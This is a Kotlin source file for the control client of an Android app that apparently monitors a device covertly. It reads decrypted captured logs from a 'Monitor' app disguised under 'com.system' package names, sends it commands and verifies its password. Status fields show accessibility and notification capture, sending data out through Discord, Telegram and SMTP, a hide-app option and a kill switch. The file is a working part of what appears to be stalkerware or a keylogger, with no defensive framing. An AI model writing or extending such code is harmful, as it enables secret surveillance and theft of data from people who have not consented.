package com.system.controller

import android.content.Context
import android.net.Uri
import android.os.Bundle

/**
 * Client for the Monitor app's ContentProvider.
 * All cross-app communication goes through here.
 */
object MonitorClient {

    private val AUTHORITY = "com.system.service.provider"
    private val LOGS_URI = Uri.parse("content://$AUTHORITY/logs")
    private val STATUS_URI = Uri.parse("content://$AUTHORITY/status")

    /** Check if the monitor app is installed and provider is accessible. */
    fun isMonitorInstalled(context: Context): Boolean {
        return try {
            context.contentResolver.query(STATUS_URI, null, null, null, null)?.use { true } ?: false
        } catch (_: Exception) {
            false
        }
    }

    /** Get all decrypted log entries. */
    fun getLogs(context: Context): List<String> {
        val logs = mutableListOf<String>()
        try {
            context.contentResolver.query(LOGS_URI, null, null, null, null)?.use { cursor ->
                val contentIdx = cursor.getColumnIndex("content")
                while (cursor.moveToNext()) {
                    logs.add(cursor.getString(contentIdx))
                }
            }
        } catch (_: Exception) { }
        return logs
    }

    /** Get service status as a data class. */
    fun getStatus(context: Context): StatusData {
        try {
            val result = context.contentResolver.call(
                Uri.parse("content://$AUTHORITY"), "get_status", null, null
            )
            if (result != null && result.getBoolean("success", false)) {
                return StatusData(
                    isRunning = result.getBoolean("is_running", false),
                    isPaused = result.getBoolean("is_paused", false),
                    isConfigured = result.getBoolean("is_configured", false),
                    accEnabled = result.getBoolean("acc_enabled", false),
                    notifEnabled = result.getBoolean("notif_enabled", false),
                    batteryExempt = result.getBoolean("battery_exempt", false),
                    hasDiscord = result.getBoolean("has_discord", false),
                    hasTelegram = result.getBoolean("has_telegram", false),
                    hasSmtp = result.getBoolean("has_smtp", false),
                    logCount = result.getInt("log_count", 0),
                    fileSize = result.getLong("file_size", 0L),
                    killSwitch = result.getBoolean("kill_switch", false),
                    localLog = result.getBoolean("local_log", false),
                    hideApp = result.getBoolean("hide_app", false),
                    hasPassword = result.getBoolean("has_password", false),
                    thermalLevel = result.getString("thermal_level") ?: "NORMAL",
                    batteryTemp = result.getFloat("battery_temp", 0f),
                    batteryLevel = result.getInt("battery_level", 100),
                    isCharging = result.getBoolean("is_charging", false),
                    powerSave = result.getBoolean("power_save", false),
                    monitorInstalled = true
                )
            }
        } catch (_: Exception) { }
        return StatusData(monitorInstalled = false)
    }

    /** Send a command to the monitor app. */
    fun sendCommand(context: Context, command: String): Boolean {
        return try {
            val result = context.contentResolver.call(
                Uri.parse("content://$AUTHORITY"), command, null, null
            )
            result?.getBoolean("success", false) ?: false
        } catch (_: Exception) {
            false
        }
    }

    /** Verify password against the Monitor's encryption password. */
    fun verifyPassword(context: Context, password: String): Boolean {
        return try {
            val result = context.contentResolver.call(
                Uri.parse("content://$AUTHORITY"), "verify_password", password, null
            )
            result?.getBoolean("verified", false) ?: false
        } catch (_: Exception) {
            false
        }
    }

    data class StatusData(
        val isRunning: Boolean = false,
        val isPaused: Boolean = false,
        val isConfigured: Boolean = false,
        val accEnabled: Boolean = false,
        val notifEnabled: Boolean = false,
        val batteryExempt: Boolean = false,
        val hasDiscord: Boolean = false,
        val hasTelegram: Boolean = false,
        val hasSmtp: Boolean = false,
        val logCount: Int = 0,
        val fileSize: Long = 0L,
        val killSwitch: Boolean = false,
        val localLog: Boolean = false,
        val hideApp: Boolean = false,
        val hasPassword: Boolean = false,
        val thermalLevel: String = "NORMAL",
        val batteryTemp: Float = 0f,
        val batteryLevel: Int = 100,
        val isCharging: Boolean = false,
        val powerSave: Boolean = false,
        val monitorInstalled: Boolean = false
    ) {
        val fileSizeStr: String get() = when {
            fileSize > 1048576 -> "${fileSize / 1048576}MB"
            fileSize > 1024 -> "${fileSize / 1024}KB"
            else -> "${fileSize}B"
        }

        val thermalEmoji: String get() = when (thermalLevel) {
            "NORMAL" -> "🟢"
            "WARM" -> "🟡"
            "HOT" -> "🟠"
            "CRITICAL" -> "🔴"
            else -> "⚪"
        }
    }
}
